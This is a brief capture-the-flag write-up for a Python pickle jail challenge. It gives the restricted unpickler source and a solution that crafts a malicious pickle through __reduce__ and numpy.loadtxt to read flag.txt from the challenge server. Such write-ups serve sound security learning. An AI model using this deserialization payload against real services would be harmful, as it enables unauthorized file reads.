# pickled magic

## Challenge

```py
#!/usr/local/bin/python3
# modified from https://github.com/splitline/My-CTF-Challenges/blob/master/hitcon-quals/2022/misc/Picklection/release/share/chal.py
import pickle, numpy, io
from pickle import _getattribute
class RestrictedUnpickler(pickle.Unpickler): 
     def find_class(self, module, name): 
        if module == 'numpy' and '__' not in name:
            return _getattribute(numpy, name)[0]
        raise pickle.UnpicklingError('bad')

data = bytes.fromhex(input("(hex)> "))
print(RestrictedUnpickler(io.BytesIO(data)).load())
```

## Solution

Code:
```py
import pickle
import numpy

class FlagReader:
    def __reduce__(self):
        return (numpy.loadtxt, ('flag.txt', 'str'))

print(pickle.dumps(FlagReader()).hex())
```

Usage:
```
❯ (python ./payload.py; cat) |  nc challs1.pyjail.club 5200
(hex)> jail{idk_about_mag1c_but_this_is_definitely_pickled}
```

## Flag

`jail{idk_about_mag1c_but_this_is_definitely_pickled}`
